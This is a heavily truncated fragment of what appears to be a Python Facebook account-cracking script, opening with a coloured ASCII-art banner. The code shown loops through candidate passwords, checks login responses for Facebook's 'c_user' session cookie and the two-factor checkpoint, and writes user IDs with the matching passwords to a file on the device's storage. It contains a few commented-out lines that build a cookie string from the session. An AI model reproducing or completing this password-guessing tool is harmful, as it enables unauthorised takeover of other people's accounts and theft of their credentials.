...
logo =("""
\x1b[1;96m.88b  d88. d8888b. db    db       d88b d888888b d8888b.  .d88b.  d8b   db
\x1b[1;96m88'YbdP`88 88  `8D `8b  d8'       `8P'   `88'   88  `8D .8P  Y8. 888o  88
\x1b[1;96m88  88  88 88oobY'  `8bd8'         88     88    88oooY' 88    88 88V8o 88
\x1b[1;96m88  88  88 88`8b    .dPYb.         88     88    88~~~b. 88    88 88 V8o88
\x1b[1;96m88  88  88 88 `88. .8P  Y8. db db. 88    .88.   88   8D `8b  d8' 88  V888
\x1b[1;96mYP  YP  YP 88   YD YP    YP V8 Y8888P  Y888888P Y8888P'  `Y88P'  VP   V8P
\x1b[1;96m                             P                                 
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    #coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    #coki1 = coki.split("1000")[1]
